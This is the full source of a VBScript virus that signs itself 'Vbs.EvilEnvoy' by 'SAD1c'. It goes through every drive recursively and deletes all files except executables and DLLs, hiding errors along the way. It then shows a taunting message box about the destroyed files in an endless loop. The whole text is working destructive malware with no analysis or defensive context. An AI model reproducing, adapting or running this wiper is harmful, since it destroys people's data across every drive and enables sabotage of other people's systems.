' Vbs.EvilEnvoy - By SAD1c
on error resume next
dim fso,drive,file,all,folder,fileext,msg
set fso=createobject("scripting.filesystemobject")
for each drive in fso.drives
	if drive.isready then
		dirlist(drive.path&"\")
	end if
next
sub dirlist(dirpath)
	on error resume next
	set all=fso.getfolder(dirpath)
	for each file in all.files
		erasefile(file.path)
	next
	for each folder in all.subfolders
		dirlist(folder.path)
	next
end sub
sub erasefile(filepath)
	on error resume next
	fileext=lcase(fso.getextensionname(filepath))
	if fileext<>"exe" and fileext<>"com" and fileext<>"dll" then
		fso.deletefile filepath,1
	end if
end sub
msg="Nothing personal, but my ""Vbs.EvilEnvoy"" killed almost all of your files. Hope you had some backups..."&vbcrlf&"Greetings,"&vbcrlf&"	SAD1c"
do
msgbox msg,4096,"Vbs.EvilEnvoy Striked! Your system's security sucks!"
loop